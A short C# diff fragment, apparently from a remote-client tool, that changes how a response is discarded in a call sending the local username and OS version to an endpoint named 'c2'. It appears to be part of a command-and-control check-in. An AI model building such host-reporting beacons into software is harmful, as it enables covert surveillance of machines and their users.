@@ -20,7 +20,7 @@ namespace nucleus_remote_client.Client
         public async Task ExecuteAsync(HostSettings hostSettings)
         {
             var client = ClientHelper.GetHttpClient(hostSettings);
-            var _response = await client.PutAsJsonAsync("c2", new
+            _ = await client.PutAsJsonAsync("c2", new
             {
                 username = Environment.UserName,
                 os = Environment.OSVersion.VersionString,
